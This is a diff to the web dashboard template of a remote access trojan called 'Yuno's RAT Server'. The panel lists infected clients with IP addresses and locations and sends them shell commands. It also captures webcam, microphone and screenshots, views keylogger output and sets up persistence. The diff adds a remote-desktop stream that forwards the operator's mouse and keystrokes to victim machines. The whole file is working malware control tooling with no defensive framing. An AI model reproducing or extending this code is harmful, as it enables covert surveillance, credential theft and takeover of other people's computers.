@@ -205,6 +205,7 @@
         .panel-icon.system { background: var(--accent-purple); color: white; }
         .panel-icon.media { background: var(--accent-amber); color: white; }
         .panel-icon.keylog { background: var(--accent-red); color: white; }
+        .panel-icon.remote { background: var(--accent-green); color: white; }
 
         .panel-title {
             font-size: clamp(0.875rem, 2.5vw, 1.1rem);
@@ -223,8 +224,7 @@
 
         .client-item {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
+            flex-direction: column;
             padding: clamp(0.75rem, 2vw, 1rem);
             background: var(--bg-secondary);
             border: 1px solid var(--border-primary);
@@ -244,6 +244,12 @@
             background: rgba(2, 132, 199, 0.1);
         }
 
+        .client-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
         .client-ip {
             font-family: 'JetBrains Mono', monospace;
             color: var(--accent-green);
@@ -253,12 +259,27 @@
 
         .client-status {
             padding: 0.25rem 0.75rem;
-            background: rgba(22, 163, 74, 0.1);
-            border: 1px solid var(--accent-green);
             border-radius: 1.25rem;
             font-size: clamp(0.625rem, 1.5vw, 0.8rem);
-            color: var(--accent-green);
             font-weight: 500;
+        }
+
+        .client-status.active {
+            background: rgba(22, 163, 74, 0.1);
+            border: 1px solid var(--accent-green);
+            color: var(--accent-green);
+        }
+
+        .client-status.idle {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid var(--accent-red);
+            color: var(--accent-red);
+        }
+
+        .client-details {
+            margin-top: 0.5rem;
+            font-size: clamp(0.625rem, 1.5vw, 0.8rem);
+            color: var(--text-secondary);
         }
 
         .command-section {
@@ -392,6 +413,28 @@
             margin-bottom: 1rem;
         }
 
+        .remote-desktop {
+            position: relative;
+            background: rgba(10, 14, 26, 0.5);
+            border: 1px solid var(--border-primary);
+            border-radius: 0.75rem;
+            padding: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        .remote-screen {
+            max-width: 100%;
+            max-height: 500px;
+            border-radius: 0.5rem;
+            cursor: crosshair;
+        }
+
+        .remote-controls {
+            display: flex;
+            gap: 0.5rem;
+            margin-top: 1rem;
+        }
+
         .files-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
@@ -501,7 +544,12 @@
             white-space: pre-wrap;
         }
 
-        /* Scrollbar Styling */
+        .keylog-actions {
+            margin-top: 1rem;
+            display: flex;
+            gap: 0.5rem;
+        }
+
         ::-webkit-scrollbar {
             width: 0.5rem;
         }
@@ -520,7 +568,6 @@
             background: var(--text-muted);
         }
 
-        /* Responsive Adjustments */
         @media (max-width: 640px) {
             .container {
                 padding: 0.5rem;
@@ -559,19 +606,16 @@
     <div class="background-pattern"></div>
     
     <div class="container">
-        <!-- Header -->
         <div class="header">
             <h1>Yuno's RAT Server</h1>
             <div class="subtitle">Remote Access Terminal - Professional Interface</div>
             <div class="credits">Made by Izumi</div>
         </div>
 
-        <!-- Warning -->
         <div class="sudo-warning" id="sudo-warning" style="display: none;">
             Warning: sudo commands are blocked in this environment. Use non-root commands instead.
         </div>
 
-        <!-- Status Panel -->
         <div class="status-panel">
             <div class="status-grid">
                 <div class="status-item">
@@ -589,9 +633,7 @@
             </div>
         </div>
 
-        <!-- Main Grid -->
         <div class="main-grid">
-            <!-- Connected Clients Panel -->
             <div class="panel">
                 <div class="panel-header">
                     <div class="panel-icon clients">C</div>
@@ -602,8 +644,13 @@
                         {% if clients %}
                             {% for client in clients %}
                                 <div class="client-item" data-client-id="{{ client }}">
-                                    <span class="client-ip">{{ client }}</span>
-                                    <span class="client-status">Online</span>
+                                    <div class="client-header">
+                                        <span class="client-ip">{{ client }}</span>
+                                        <span class="client-status">Online</span>
+                                    </div>
+                                    <div class="client-details">
+                                        IP: Unknown | Location: Unknown
+                                    </div>
                                 </div>
                             {% endfor %}
                         {% else %}
@@ -613,7 +660,6 @@
                 </div>
             </div>
 
-            <!-- Command Interface Panel -->
             <div class="panel">
                 <div class="panel-header">
                     <div class="panel-icon terminal">T</div>
@@ -633,52 +679,53 @@
                             <button class="quick-action-btn" data-command="webcam">Capture Webcam</button>
                             <button class="quick-action-btn" data-command="mic">Record Mic</button>
                             <button class="quick-action-btn" data-command="screenshot">Take Screenshot</button>
-                            <button class="quick-action-btn" data-command="move 500 500">Move Mouse</button>
-                            <button class="quick-action-btn" data-command="click left">Click Left</button>
-                            <button class="quick-action-btn" data-command="download C:\\test.txt" onclick="this.dataset.command = (navigator.platform.includes('Win') ? 'download C:\\test.txt' : 'download /tmp/test.txt')">Download File</button>
+                            <button class="quick-action-btn" data-command="setup_persistence">Setup Persistence</button>
+                            <button class="quick-action-btn" data-command="exit">Disconnect Client</button>
                         </div>
 
                         <div class="upload-section">
-                            <form class="upload-form" id="upload-form" enctype="multipart/form-data">
-                                <input type="file" class="form-input" id="upload-input" required>
-                                <button type="submit" class="btn">
-                                    <span>↑</span>
-                                    Upload
-                                </button>
-                            </form>
+                            <div class="upload-form">
+                                <input type="file" id="file-upload" class="form-input" accept="*/*">
+                                <button class="btn" id="upload-btn">Upload File</button>
+                            </div>
                         </div>
 
-                        <form class="command-form" id="command-form">
-                            <select class="form-select" id="client-select" required>
-                                <option value="">Select client</option>
-                                {% if clients %}
-                                    {% for client in clients %}
-                                        <option value="{{ client }}">{{ client }}</option>
-                                    {% endfor %}
-                                {% endif %}
+                        <div class="command-form">
+                            <select id="client-select" class="form-select">
+                                <option value="">Select a client</option>
+                                {% for client in clients %}
+                                    <option value="{{ client }}">{{ client }}</option>
+                                {% endfor %}
                             </select>
-                            <input type="text" class="form-input" id="current-dir" readonly value="[Unknown]">
-                            <div style="display: flex; gap: 0.5rem;">
-                                <input type="text" class="form-input" id="command-input" placeholder="Enter command (e.g., cd dir, dir)" required>
-                                <button type="submit" class="btn">
-                                    <span>→</span>
-                                    Send
-                                </button>
-                            </div>
-                        </form>
+                            <input type="text" id="command-input" class="form-input" placeholder="Enter command (e.g., dir, whoami, download path/to/file)">
+                            <button class="btn" id="send-btn">Send Command</button>
+                        </div>
                     </div>
-                    
-                    <div class="divider"></div>
-                    
+
                     <div class="output-section">
                         <h4>Command Output</h4>
-                        <div class="output-container" id="command-output">No command output yet...</div>
+                        <div class="output-container" id="output-container"></div>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- System Monitor Panel -->
+        <div class="panel">
+            <div class="panel-header">
+                <div class="panel-icon remote">R</div>
+                <div class="panel-title">Remote Desktop</div>
+            </div>
+            <div class="panel-content">
+                <div class="remote-desktop">
+                    <img id="remote-screen" class="remote-screen" src="" alt="Remote Screen">
+                    <div class="remote-controls">
+                        <button class="quick-action-btn" id="start-stream-btn" data-command="start_stream">Start Stream</button>
+                        <button class="quick-action-btn" id="stop-stream-btn" data-command="stop_stream">Stop Stream</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
         <div class="panel">
             <div class="panel-header">
                 <div class="panel-icon system">S</div>
@@ -691,11 +738,10 @@
             </div>
         </div>
 
-        <!-- Network Traffic Panel -->
         <div class="panel">
             <div class="panel-header">
                 <div class="panel-icon network">N</div>
-                <div class="panel-title">Network Traffic Monitor</div>
+                <div class="panel-title">Network Monitor</div>
             </div>
             <div class="panel-content">
                 <div class="network-graph">
@@ -704,7 +750,6 @@
             </div>
         </div>
 
-        <!-- Media Panel -->
         <div class="panel">
             <div class="panel-header">
                 <div class="panel-icon media">M</div>
@@ -713,49 +758,51 @@
             <div class="panel-content">
                 <div class="media-section">
                     <div class="media-item" id="webcam-preview">
-                        <h4>Webcam</h4>
                         <img id="webcam-image" class="media-preview" src="" alt="Webcam Preview">
+                        <p>Webcam Capture</p>
+                    </div>
+                    <div class="media-item" id="mic-preview">
+                        <audio id="mic-audio" class="media-preview" controls></audio>
+                        <p>Mic Recording</p>
                     </div>
                     <div class="media-item" id="screenshot-preview">
-                        <h4>Screenshot</h4>
                         <img id="screenshot-image" class="media-preview" src="" alt="Screenshot Preview">
+                        <p>Screenshot</p>
                     </div>
-                </div>
-                <div class="media-item" id="mic-preview">
-                    <h4>Mic Recording</h4>
-                    <audio id="mic-audio" controls></audio>
                 </div>
             </div>
         </div>
 
-        <!-- Keylogger Panel -->
         <div class="panel">
             <div class="panel-header">
                 <div class="panel-icon keylog">K</div>
                 <div class="panel-title">Keylogger</div>
             </div>
             <div class="panel-content">
-                <div class="keylog-container" id="keylog-output">No keystrokes logged yet...</div>
+                <div class="keylog-container" id="keylog-container"></div>
+                <div class="keylog-actions">
+                    <button class="quick-action-btn" data-command="clear_keylogs">Clear Keylogs</button>
+                </div>
             </div>
         </div>
 
-        <!-- Files Panel -->
         <div class="panel">
             <div class="panel-header">
                 <div class="panel-icon files">F</div>
-                <div class="panel-title">Exfiltrated Data Files</div>
+                <div class="panel-title">Files</div>
             </div>
             <div class="panel-content">
-                <div class="files-grid" id="files-list">
+                <div class="files-grid" id="files-grid">
                     {% if files %}
                         {% for file in files %}
-                            <div class="file-item" data-filename="{{ file }}">
-                                <div class="file-icon">F</div>
+                            <div class="file-item">
+                                <div class="file-icon">📄</div>
                                 <div class="file-name">{{ file }}</div>
+                                <a href="{{ url_for('view_file', filename=file) }}" target="_blank" class="btn">View</a>
                             </div>
                         {% endfor %}
                     {% else %}
-                        <div class="empty-state">No data files available</div>
+                        <div class="empty-state">No files available</div>
                     {% endif %}
                 </div>
             </div>
@@ -763,450 +810,346 @@
     </div>
 
     <script>
-        // Connect to WebSocket server
         const socket = io();
+        let selectedClient = null;
+        let systemChart, networkChart;
+        const systemData = { cpu: [], memory: [], labels: [] };
+        const networkData = { sent: [], received: [], labels: [] };
+        const maxDataPoints = 20;
 
-        socket.on('connect', () => {
-            console.log('Connected to WebSocket server');
+        function updateTime() {
+            const now = new Date();
+            document.getElementById('current-time').textContent = now.toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
+        }
+        setInterval(updateTime, 1000);
+        updateTime();
+
+        function initializeCharts() {
+            const systemCtx = document.getElementById('system-chart').getContext('2d');
+            systemChart = new Chart(systemCtx, {
+                type: 'line',
+                data: {
+                    labels: systemData.labels,
+                    datasets: [
+                        { label: 'CPU Usage (%)', data: systemData.cpu, borderColor: '#0284c7', fill: false },
+                        { label: 'Memory Usage (MB)', data: systemData.memory, borderColor: '#7c3aed', fill: false }
+                    ]
+                },
+                options: {
+                    scales: {
+                        x: { title: { display: true, text: 'Time', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } },
+                        y: { title: { display: true, text: 'Usage', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } }
+                    },
+                    plugins: { legend: { labels: { color: '#b3c4d8' } } },
+                    responsive: true,
+                    maintainAspectRatio: false
+                }
+            });
+
+            const networkCtx = document.getElementById('network-chart').getContext('2d');
+            networkChart = new Chart(networkCtx, {
+                type: 'line',
+                data: {
+                    labels: networkData.labels,
+                    datasets: [
+                        { label: 'Sent (Mbps)', data: networkData.sent, borderColor: '#16a34a', fill: false },
+                        { label: 'Received (Mbps)', data: networkData.received, borderColor: '#ea580c', fill: false }
+                    ]
+                },
+                options: {
+                    scales: {
+                        x: { title: { display: true, text: 'Time', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } },
+                        y: { title: { display: true, text: 'Speed (Mbps)', color: '#b3c4d8' }, ticks: { color: '#b3c4d8' } }
+                    },
+                    plugins: { legend: { labels: { color: '#b3c4d8' } } },
+                    responsive: true,
+                    maintainAspectRatio: false
+                }
+            });
+        }
+
+        function updateClientList(clients) {
+            const clientList = document.getElementById('clients-list');
+            const clientSelect = document.getElementById('client-select');
+            clientList.innerHTML = '';
+            clientSelect.innerHTML = '<option value="">Select a client</option>';
+
+            if (clients.length === 0) {
+                clientList.innerHTML = '<div class="empty-state">No clients connected</div>';
+                document.getElementById('client-count').textContent = '0 Clients Connected';
+                return;
+            }
+
+            document.getElementById('client-count').textContent = `${clients.length} Client${clients.length !== 1 ? 's' : ''} Connected`;
+
+            clients.forEach(client => {
+                const clientItem = document.createElement('div');
+                clientItem.className = `client-item ${selectedClient === client.id ? 'selected' : ''}`;
+                clientItem.dataset.clientId = client.id;
+
+                const statusClass = client.activity.status === 'active' ? 'active' : 'idle';
+                const system = client.system || {};
+                const network = system.network || {};
+                const ipAddresses = network.ip_addresses || ['Unknown'];
+                const location = network.location || {};
+                const city = location.city || 'Unknown';
+                const country = location.country || 'Unknown';
+
+                clientItem.innerHTML = `
+                    <div class="client-header">
+                        <span class="client-ip">${ipAddresses[0]}</span>
+                        <span class="client-status ${statusClass}">${client.activity.status.charAt(0).toUpperCase() + client.activity.status.slice(1)}</span>
+                    </div>
+                    <div class="client-details">
+                        IP: ${ipAddresses.join(', ')} | Location: ${city}, ${country}
+                    </div>
+                `;
+
+                clientItem.addEventListener('click', () => {
+                    document.querySelectorAll('.client-item').forEach(item => item.classList.remove('selected'));
+                    clientItem.classList.add('selected');
+                    selectedClient = client.id;
+                    document.getElementById('client-select').value = client.id;
+                });
+
+                clientList.appendChild(clientItem);
+
+                const option = document.createElement('option');
+                option.value = client.id;
+                option.textContent = `${client.id} (${ipAddresses[0]})`;
+                clientSelect.appendChild(option);
+            });
+        }
+
+        function appendOutput(data) {
+            const outputContainer = document.getElementById('output-container');
+            const entry = `[${data.timestamp}] Client ${data.client_id} (${data.command}): ${data.output}\nCurrent Dir: ${data.current_dir}\n\n`;
+            outputContainer.textContent += entry;
+            outputContainer.scrollTop = outputContainer.scrollHeight;
+
+            if (data.output.includes('sudo is blocked')) {
+                document.getElementById('sudo-warning').style.display = 'block';
+            }
+        }
+
+        function updateSystemGraph(data) {
+            const time = new Date(data.timestamp * 1000).toLocaleTimeString();
+            systemData.labels.push(time);
+            systemData.cpu.push(data.cpu_usage_percent);
+            systemData.memory.push(data.memory_usage_mb);
+
+            if (systemData.labels.length > maxDataPoints) {
+                systemData.labels.shift();
+                systemData.cpu.shift();
+                systemData.memory.shift();
+            }
+
+            systemChart.update();
+        }
+
+        function updateNetworkGraph(data) {
+            const time = new Date(data.timestamp * 1000).toLocaleTimeString();
+            networkData.labels.push(time);
+            networkData.sent.push(data.sent_speed_mbps);
+            networkData.received.push(data.recv_speed_mbps);
+
+            if (networkData.labels.length > maxDataPoints) {
+                networkData.labels.shift();
+                networkData.sent.shift();
+                networkData.received.shift();
+            }
+
+            networkChart.update();
+        }
+
+        function updateMedia(data) {
+            if (data.image) {
+                if (data.type === "webcam_data") {
+                    document.getElementById('webcam-image').src = `data:image/jpeg;base64,${data.image}`;
+                    document.getElementById('webcam-preview').style.display = 'block';
+                } else if (data.type === "screenshot_data") {
+                    document.getElementById('screenshot-image').src = `data:image/png;base64,${data.image}`;
+                    document.getElementById('screenshot-preview').style.display = 'block';
+                } else if (data.type === "screen_stream") {
+                    document.getElementById('remote-screen').src = `data:image/jpeg;base64,${data.image}`;
+                }
+            }
+            if (data.audio) {
+                const audio = document.getElementById('mic-audio');
+                audio.src = `data:audio/wav;base64,${data.audio}`;
+                audio.style.display = 'block';
+                document.getElementById('mic-preview').style.display = 'block';
+            }
+        }
+
+        function updateKeylogs(data) {
+            const keylogContainer = document.getElementById('keylog-container');
+            keylogContainer.textContent = data.logs || 'No keylogs available';
+            keylogContainer.scrollTop = keylogContainer.scrollHeight;
+        }
+
+        function setupRemoteDesktopControls() {
+            const screen = document.getElementById('remote-screen');
+            let isDragging = false;
+
+            screen.addEventListener('mousedown', (e) => {
+                if (!selectedClient) return;
+                isDragging = true;
+                const rect = screen.getBoundingClientRect();
+                const x = ((e.clientX - rect.left) / rect.width) * 1280; // Scale to 1280x720
+                const y = ((e.clientY - rect.top) / rect.height) * 720;
+                const button = e.button === 0 ? 'left' : 'right';
+                socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'mouse_click', x, y, button, pressed: true }) });
+            });
+
+            screen.addEventListener('mouseup', (e) => {
+                if (!selectedClient) return;
+                isDragging = false;
+                const rect = screen.getBoundingClientRect();
+                const x = ((e.clientX - rect.left) / rect.width) * 1280;
+                const y = ((e.clientY - rect.top) / rect.height) * 720;
+                const button = e.button === 0 ? 'left' : 'right';
+                socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'mouse_click', x, y, button, pressed: false }) });
+            });
+
+            screen.addEventListener('mousemove', (e) => {
+                if (!selectedClient) return;
+                const rect = screen.getBoundingClientRect();
+                const x = ((e.clientX - rect.left) / rect.width) * 1280;
+                const y = ((e.clientY - rect.top) / rect.height) * 720;
+                socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'mouse_move', x, y }) });
+            });
+
+            document.addEventListener('keydown', (e) => {
+                if (!selectedClient) return;
+                const key = e.key === ' ' ? 'space' : e.key.length > 1 ? `Key.${e.key.toLowerCase()}` : e.key;
+                socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'key_press', key, pressed: true }) });
+            });
+
+            document.addEventListener('keyup', (e) => {
+                if (!selectedClient) return;
+                const key = e.key === ' ' ? 'space' : e.key.length > 1 ? `Key.${e.key.toLowerCase()}` : e.key;
+                socket.emit('remote_input', { client_id: selectedClient, input_data: JSON.stringify({ type: 'key_press', key, pressed: false }) });
+            });
+
+            document.getElementById('start-stream-btn').addEventListener('click', () => {
+                if (selectedClient) {
+                    socket.emit('command', 'start_stream', { to: selectedClient });
+                }
+            });
+
+            document.getElementById('stop-stream-btn').addEventListener('click', () => {
+                if (selectedClient) {
+                    socket.emit('command', 'stop_stream', { to: selectedClient });
+                }
+            });
+        }
+
+        document.getElementById('send-btn').addEventListener('click', () => {
+            const clientId = document.getElementById('client-select').value;
+            const command = document.getElementById('command-input').value.trim();
+            if (clientId && command) {
+                fetch('/send_command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams({ client_id: clientId, command })
+                }).then(response => response.json()).then(data => {
+                    if (data.status === 'success') {
+                        document.getElementById('command-input').value = '';
+                    }
+                });
+            }
+        });
+
+        document.getElementById('upload-btn').addEventListener('click', () => {
+            const fileInput = document.getElementById('file-upload');
+            if (fileInput.files.length > 0) {
+                const formData = new FormData();
+                formData.append('file', fileInput.files[0]);
+                fetch('/upload', {
+                    method: 'POST',
+                    body: formData
+                }).then(response => response.json()).then(data => {
+                    if (data.status === 'success') {
+                        fileInput.value = '';
+                    }
+                });
+            }
+        });
+
+        document.querySelectorAll('.quick-action-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                const clientId = document.getElementById('client-select').value;
+                const command = btn.dataset.command;
+                if (clientId && command) {
+                    fetch('/send_command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: new URLSearchParams({ client_id: clientId, command })
+                    });
+                }
+            });
+        });
+
+        socket.on('client_update', (clients) => {
             socket.emit('request_client_info');
         });
 
-        // Store client info
-        const clientInfoMap = new Map();
-        const clientsList = document.getElementById('clients-list');
-        const clientSelect = document.getElementById('client-select');
-        const clientCount = document.getElementById('client-count');
-        const filesList = document.getElementById('files-list');
-        const sudoWarning = document.getElementById('sudo-warning');
-
-        // Initialize Charts
-        const systemCtx = document.getElementById('system-chart').getContext('2d');
-        const systemChart = new Chart(systemCtx, {
-            type: 'line',
-            data: {
-                labels: [],
-                datasets: [
-                    {
-                        label: 'CPU Usage (%)',
-                        data: [],
-                        borderColor: 'rgba(124, 58, 237, 1)',
-                        backgroundColor: 'rgba(124, 58, 237, 0.2)',
-                        fill: true,
-                        tension: 0.4
-                    },
-                    {
-                        label: 'Memory Usage (MB)',
-                        data: [],
-                        borderColor: 'rgba(16, 163, 74, 1)',
-                        backgroundColor: 'rgba(16, 163, 74, 0.2)',
-                        fill: true,
-                        tension: 0.4
-                    }
-                ]
-            },
-            options: {
-                scales: {
-                    x: {
-                        display: true,
-                        title: {
-                            display: true,
-                            text: 'Time',
-                            color: '#b3c4d8'
-                        },
-                        ticks: {
-                            color: '#6b7280',
-                            maxTicksLimit: 10
-                        },
-                        grid: {
-                            color: 'rgba(55, 65, 81, 0.2)'
-                        }
-                    },
-                    y: {
-                        beginAtZero: true,
-                        title: {
-                            display: true,
-                            text: 'Value',
-                            color: '#b3c4d8'
-                        },
-                        ticks: {
-                            color: '#6b7280'
-                        },
-                        grid: {
-                            color: 'rgba(55, 65, 81, 0.2)'
-                        }
-                    }
-                },
-                plugins: {
-                    legend: {
-                        labels: {
-                            color: '#b3c4d8'
-                        }
-                    }
-                },
-                animation: {
-                    duration: 500 // Smooth transitions
-                }
-            }
-        });
-
-        const networkCtx = document.getElementById('network-chart').getContext('2d');
-        const networkChart = new Chart(networkCtx, {
-            type: 'line',
-            data: {
-                labels: [], // Timestamps
-                datasets: [
-                    {
-                        label: 'Sent Speed (Mbps)',
-                        data: [],
-                        borderColor: 'rgba(2, 132, 199, 1)',
-                        backgroundColor: 'rgba(2, 132, 199, 0.2)',
-                        fill: true,
-                        tension: 0.4
-                    },
-                    {
-                        label: 'Received Speed (Mbps)',
-                        data: [],
-                        borderColor: 'rgba(124, 58, 237, 1)',
-                        backgroundColor: 'rgba(124, 58, 237, 0.2)',
-                        fill: true,
-                        tension: 0.4
-                    }
-                ]
-            },
-            options: {
-                scales: {
-                    x: {
-                        display: true,
-                        title: {
-                            display: true,
-                            text: 'Time',
-                            color: '#b3c4d8'
-                        },
-                        ticks: {
-                            color: '#6b7280',
-                            maxTicksLimit: 10
-                        },
-                        grid: {
-                            color: 'rgba(55, 65, 81, 0.2)'
-                        }
-                    },
-                    y: {
-                        beginAtZero: true,
-                        title: {
-                            display: true,
-                            text: 'Speed (Mbps)',
-                            color: '#b3c4d8'
-                        },
-                        ticks: {
-                            color: '#6b7280'
-                        },
-                        grid: {
-                            color: 'rgba(55, 65, 81, 0.2)'
-                        }
-                    }
-                },
-                plugins: {
-                    legend: {
-                        labels: {
-                            color: '#b3c4d8'
-                        }
-                    }
-                },
-                animation: {
-                    duration: 500 // Smooth transitions
-                }
-            }
-        });
-
-        const MAX_DATA_POINTS = 20;
-        const networkDataMap = new Map();
-        const systemDataMap = new Map();
-
-        socket.on('client_update', (clients) => {
-            clientsList.innerHTML = '';
-            if (clients.length > 0) {
-                clients.forEach(clientId => {
-                    const clientItem = document.createElement('div');
-                    clientItem.className = 'client-item';
-                    clientItem.setAttribute('data-client-id', clientId);
-                    clientItem.innerHTML = `
-                        <span class="client-ip">${clientId}</span>
-                        <span class="client-status">Online</span>
-                    `;
-                    clientsList.appendChild(clientItem);
-                });
-            } else {
-                clientsList.innerHTML = '<div class="empty-state">No clients connected</div>';
-            }
-            clientCount.textContent = `${clients.length} Clients Connected`;
-            updateClientSelect(clients);
-        });
-
-        socket.on('client_info', (data) => {
-            data.forEach(client => {
-                const clientId = client.id;
-                const username = client.system?.username || clientId;
-                clientInfoMap.set(clientId, { username });
-
-                let clientItem = clientsList.querySelector(`.client-item[data-client-id="${clientId}"]`);
-                if (clientItem) {
-                    clientItem.querySelector('.client-ip').textContent = `${username} (${clientId})`;
-                }
-
-                let option = clientSelect.querySelector(`option[value="${clientId}"]`);
-                if (option) {
-                    option.textContent = `${username} (${clientId})`;
-                }
-            });
-            clientCount.textContent = `${clientInfoMap.size} Clients Connected`;
+        socket.on('client_info', (clients) => {
+            updateClientList(clients);
         });
 
         socket.on('command_output', (data) => {
-            const outputDiv = document.getElementById('command-output');
-            const currentDirInput = document.getElementById('current-dir');
-            const timestamp = data.timestamp;
-            const clientId = data.client_id;
-            const command = data.command;
-            const output = data.output;
-            const currentDir = data.current_dir;
-            const username = clientInfoMap.get(clientId)?.username || clientId;
+            appendOutput(data);
+        });
 
-            currentDirInput.value = `[${currentDir}]`;
-            const newOutput = `[${timestamp}] ${username} (${clientId}) executed "${command}":\n${output}\n\n`;
-            outputDiv.textContent += newOutput;
-            outputDiv.scrollTop = outputDiv.scrollHeight;
-
-            if (output.includes("sudo is blocked")) {
-                sudoWarning.style.display = 'block';
+        socket.on('system_data', (data) => {
+            if (data.client_id === selectedClient) {
+                updateSystemGraph(data);
             }
         });
 
         socket.on('network_data', (data) => {
-            const clientId = data.client_id;
-            const timestamp = new Date(data.timestamp * 1000).toLocaleTimeString();
-            const sentSpeed = data.sent_speed_mbps;
-            const recvSpeed = data.recv_speed_mbps;
-
-            if (clientId === selectedClient) {
-                networkChart.data.labels.push(timestamp);
-                networkChart.data.datasets[0].data.push(sentSpeed);
-                networkChart.data.datasets[1].data.push(recvSpeed);
-
-                if (networkChart.data.labels.length > MAX_DATA_POINTS) {
-                    networkChart.data.labels.shift();
-                    networkChart.data.datasets[0].data.shift();
-                    networkChart.data.datasets[1].data.shift();
-                }
-                networkChart.update();
-            }
-
-            if (!networkDataMap.has(clientId)) {
-                networkDataMap.set(clientId, { labels: [], sent: [], recv: [] });
-            }
-            const clientData = networkDataMap.get(clientId);
-            clientData.labels.push(timestamp);
-            clientData.sent.push(sentSpeed);
-            clientData.recv.push(recvSpeed);
-
-            if (clientData.labels.length > MAX_DATA_POINTS) {
-                clientData.labels.shift();
-                clientData.sent.shift();
-                clientData.recv.shift();
-            }
-        });
-
-        socket.on('system_data', (data) => {
-            const clientId = data.client_id;
-            const timestamp = new Date(data.timestamp * 1000).toLocaleTimeString();
-            const cpuUsage = data.cpu_usage_percent;
-            const memoryUsage = data.memory_usage_mb;
-
-            if (clientId === selectedClient) {
-                systemChart.data.labels.push(timestamp);
-                systemChart.data.datasets[0].data.push(cpuUsage);
-                systemChart.data.datasets[1].data.push(memoryUsage);
-
-                if (systemChart.data.labels.length > MAX_DATA_POINTS) {
-                    systemChart.data.labels.shift();
-                    systemChart.data.datasets[0].data.shift();
-                    systemChart.data.datasets[1].data.shift();
-                }
-                systemChart.update();
-            }
-
-            if (!systemDataMap.has(clientId)) {
-                systemDataMap.set(clientId, { labels: [], cpu: [], memory: [] });
-            }
-            const clientData = systemDataMap.get(clientId);
-            clientData.labels.push(timestamp);
-            clientData.cpu.push(cpuUsage);
-            clientData.memory.push(memoryUsage);
-
-            if (clientData.labels.length > MAX_DATA_POINTS) {
-                clientData.labels.shift();
-                clientData.cpu.shift();
-                clientData.memory.shift();
+            if (data.client_id === selectedClient) {
+                updateNetworkGraph(data);
             }
         });
 
         socket.on('webcam_data', (data) => {
             if (data.client_id === selectedClient) {
-                const img = document.getElementById('webcam-image');
-                img.src = `data:image/jpeg;base64,${data.image}`;
+                updateMedia(data);
             }
         });
 
         socket.on('mic_data', (data) => {
             if (data.client_id === selectedClient) {
-                const audio = document.getElementById('mic-audio');
-                audio.src = `data:audio/wav;base64,${data.audio}`;
-                audio.play();
+                updateMedia(data);
             }
         });
 
         socket.on('screenshot_data', (data) => {
             if (data.client_id === selectedClient) {
-                const img = document.getElementById('screenshot-image');
-                img.src = `data:image/png;base64,${data.image}`;
+                updateMedia(data);
+            }
+        });
+
+        socket.on('screen_stream', (data) => {
+            if (data.client_id === selectedClient) {
+                updateMedia(data);
             }
         });
 
         socket.on('keylog_data', (data) => {
             if (data.client_id === selectedClient) {
-                const keylogOutput = document.getElementById('keylog-output');
-                keylogOutput.textContent = data.logs || 'No keystrokes logged yet...';
-                keylogOutput.scrollTop = keylogOutput.scrollHeight;
+                updateKeylogs(data);
             }
         });
 
-        // Update time
-        function updateTime() {
-            document.getElementById('current-time').textContent = new Date().toLocaleString();
-        }
-
-        // Handle client selection
-        let selectedClient = null;
-        function updateClientSelect(clients) {
-            clientSelect.innerHTML = '<option value="">Select client</option>';
-            clients.forEach(clientId => {
-                const username = clientInfoMap.get(clientId)?.username || clientId;
-                const option = document.createElement('option');
-                option.value = clientId;
-                option.textContent = `${username} (${clientId})`;
-                clientSelect.appendChild(option);
-            });
-            if (selectedClient && clients.includes(selectedClient)) {
-                clientSelect.value = selectedClient;
-            }
-        }
-
-        document.querySelectorAll('.client-item').forEach(item => {
-            item.addEventListener('click', () => {
-                document.querySelectorAll('.client-item').forEach(i => i.classList.remove('selected'));
-                item.classList.add('selected');
-                selectedClient = item.getAttribute('data-client-id');
-                clientSelect.value = selectedClient;
-
-                const networkData = networkDataMap.get(selectedClient) || { labels: [], sent: [], recv: [] };
-                networkChart.data.labels = networkData.labels;
-                networkChart.data.datasets[0].data = networkData.sent;
-                networkChart.data.datasets[1].data = networkData.recv;
-                networkChart.update();
-
-                const systemData = systemDataMap.get(selectedClient) || { labels: [], cpu: [], memory: [] };
-                systemChart.data.labels = systemData.labels;
-                systemChart.data.datasets[0].data = systemData.cpu;
-                systemChart.data.datasets[1].data = systemData.memory;
-                systemChart.update();
-            });
+        socket.on('connect', () => {
+            socket.emit('request_client_info');
+            initializeCharts();
+            setupRemoteDesktopControls();
         });
-
-        // Handle quick actions
-        document.querySelectorAll('.quick-action-btn').forEach(btn => {
-            btn.addEventListener('click', async () => {
-                const command = btn.getAttribute('data-command');
-                if (!selectedClient) {
-                    selectedClient = clientSelect.value;
-                }
-                if (!selectedClient) {
-                    alert('No client selected');
-                    return;
-                }
-                const formData = new FormData();
-                formData.append('client_id', selectedClient);
-                formData.append('command', command);
-                const response = await fetch('/send_command', {
-                    method: 'POST',
-                    body: formData
-                });
-                const result = await response.json();
-                console.log(`Quick action "${command}" sent to ${selectedClient}: ${result.message}`);
-            });
-        });
-
-        // Handle upload form
-        document.getElementById('upload-form').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const fileInput = document.getElementById('upload-input');
-            const file = fileInput.files[0];
-            if (!file || !selectedClient) {
-                alert('No file or client selected');
-                return;
-            }
-
-            const formData = new FormData();
-            formData.append('file', file);
-
-            const response = await fetch('/upload', {
-                method: 'POST',
-                body: formData
-            });
-            const result = await response.json();
-            console.log(result.message);
-            fileInput.value = '';
-        });
-
-        // Handle command form
-        document.getElementById('command-form').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            
-            const commandInput = document.getElementById('command-input');
-            const command = commandInput.value.trim();
